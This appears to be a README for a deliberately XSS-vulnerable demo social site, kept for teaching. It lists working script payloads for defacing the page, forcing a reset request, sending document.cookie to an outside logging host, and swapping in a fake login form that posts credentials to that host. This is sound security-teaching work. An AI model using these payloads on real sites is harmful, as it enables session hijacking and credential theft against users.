# Web security demo

A barebones social site vulnerable to XSS

## Usage

Start the service

```bash
node server.js
```

## Payloads

Try posting some malicious payloads, examples below. There is also a server that logs requests its given:

```bash
node attacker.js
```

Basic test XSS

```html
<script>alert('pwned')</script>
```

Deface page

```html
<script>document.getElementsByTagName('h1')[0].innerHTML = 'Stupidlook';document.body.style.background='#734a16'</script>
```

Act on behalf of user

```html
<script>fetch('http://localhost:3000/reset',{method:'POST'})</script>
```

Steal cookie

```html
<script>fetch('http://172.17.128.61:3001/?'+document.cookie)</script>
```

Phishing

```html
<script>if(!window.location.href.match('pwn'))document.body.innerHTML='<h1>Login</h1><form action=http://172.17.128.61:3001><input type="username" name="username" placeholder="Username"><br><input type="password" name="password" placeholder="Password"><br><p>Incorrect password</p><input type="submit" name="submit" value="Login"></form>'</script>
```
